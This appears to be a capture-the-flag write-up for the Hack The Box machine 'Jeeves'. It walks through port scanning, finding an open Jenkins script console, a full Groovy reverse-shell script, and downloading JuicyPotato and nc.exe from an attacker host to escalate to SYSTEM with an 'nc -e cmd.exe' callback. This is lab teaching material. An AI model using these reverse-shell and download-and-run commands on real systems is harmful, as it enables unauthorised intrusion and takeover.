# Jeeves [htb](https://app.hackthebox.com/machines/114)

![jeeves-01]()

## Recon

Lets start by adding the target to our `/etc/hosts` file:

![hosts-02]()


Lets scan the target with: 

`nmap -sC -sV -p- -A jeeves.htb -oN nmap.result`

![nmap-res-03]()


We get the following:

+ IIS v10.0 server on port 80. 
+ RCP endpoint mapper on port 135. 
+ SMB on port 445.
+ Jetty v9.4 server on port 50000.

Lets take a quick look at the SMB and see if we can snatch any quick wins. 


### SMB 445

Lets try connecting with a null session: 

`smbclient -U '%' -N \\\\jeeves.htb\\IPC$`

![null-fail-04]()


Lets try crackmapexec:

`crackmapexec smb jeeves.htb -u '' -p '' --users`

![crackmap-fail-05]()


Looks like we need credentials, lets move on to the IIS server on port 80.


### IIS 80

Lets open our browser and navigate towards `http://jeeves.htb/`

![jeeves-site-06]()


If we try to search anything in the search bar, we get redirectred to this `error.html` page:

![err-html-07]()


This is a predetermined outcome no matter what we input:

![source-08]()


We can't really interact with the SQL server at the moment, no request is actually being sent 
to the server, i've tested this with Burp. We can use tools to try and extract information 
from the SQL server but we need credentials. We might try that later on if we need to.

Iv'e also tried directory and subdomain enumeration, thats not the way forward, nothing comes up. 

We can conclude from this page that we might have an SQL server somewhere in the environnment and 
we know its type an version. Searching for exploits is not the way forward in this case either. 

Lets check the Jetty server on port 50000.


### Jetty 50000

Lets navigate towards `http://jeeves.htb:50000`

![jetty-site-09]()


Nothing here. If we try directory busting we find something interesting:

`ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3
-medium.txt:FUZZ -u http://jeeves.htb:50000/FUZZ`

![ffuf-res-10]()


This leads us to an unauthenticated Jenkins portal:

![jenkins-11]()


We could try to login, but why would we if we can access the script console? :

![script-console-12]()


We can use the following Groovy reverse shell

```java
String host="10.10.14.68";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

+ Make sure to update your IP. 

+ Start the listener with `nc -lnvp 8044`

+ Paste the script to the script console and execute. 

![exec-13]()


+ Get a shell:

![shell-14]()




## Privilege Escalation

If we list out our user's privileges with `whoami /priv`:

![priv-15]()


We can see we have the `SeImpersonate` privilege enabled, this is bad. This means we can try and
use [juicypotato](https://github.com/ohpe/juicy-potato) to get `NT_AUTHORITY`. 

+ download `juicypotatos` and transfer to the target with:
`powershell "Invoke-WebRequest -Uri http://10.10.14.68/JuicyPotato.exe -OutFile C:\Users\kohsuke\juicypotato.exe"`


+ Transfer `/usr/share/windows-resources/binaries/nc.exe` to the target as well with:

`powershell "Invoke-WebRequest -Uri http://10.10.14.68/nc.exe -OutFile C:\Users\kohsuke\nc.exe"`


+ Start the listener with: `nc -lnvp 9009`.


+ Execute the exploit with:

`juicypotato.exe -l 9009 -p C:\windows\system32\cmd.exe -a "/c c:\\Users\kohsuke\nc.exe -e cmd.exe 10.10.14.68 9009" -t *`

![execute-16]()


+ Get `NT_AUTHORITY`:

![root-17]()


If you want the `root.txt` flag, you wont find it in the admin's desktop folder simply with `dir`.
In CTF's we should always look for alternative data streams, which can be seen with `dir /R`:


![altr-strm-18]()


To get the contents of the file redirect it to `more` as such:

`more < hm.txt:root.txt`

![root-flag-18]()



